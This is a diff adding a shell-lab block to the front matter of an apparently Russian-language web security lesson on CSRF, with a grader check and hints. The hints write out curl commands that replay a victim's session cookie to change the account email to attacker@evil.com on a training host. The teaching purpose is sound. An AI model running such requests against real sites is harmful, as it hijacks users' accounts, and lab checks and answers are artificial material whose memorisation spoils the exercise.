@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как заставить браузер жертвы выполнить действие, обойти SameSite и токены, и как это доказать."
+lab:
+  kind: shell
+  title: "Практика: CSRF на смене email"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, profile.html]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Сначала снимаем форму профиля: curl -s https://shop.local/profile -H 'Cookie: session=alice' > profile.html"
+    - "Ищи в форме скрытое поле csrf_token. Если его нет — защита от CSRF отсутствует."
+    - "Собери авто-отправляемую форму: POST на /profile/email с email=attacker@evil.com."
+    - "Выполни POST с cookie жертвы: curl -s -X POST https://shop.local/profile/email -d 'email=attacker@evil.com' -H 'Cookie: session=alice' > found.txt"
+
 ---
 
 В прошлом уроке мы сами отправляли запросы с украденным токеном. Но есть класс атак, где токен вообще не нужен: браузер жертвы **сам** приложит её cookie к запросу, если запрос уходит на нужный сайт. Значит, достаточно заставить браузер жертвы отправить такой запрос — и действие выполнится от её имени. Это **CSRF** (Cross-Site Request Forgery, «подделка межсайтового запроса»).
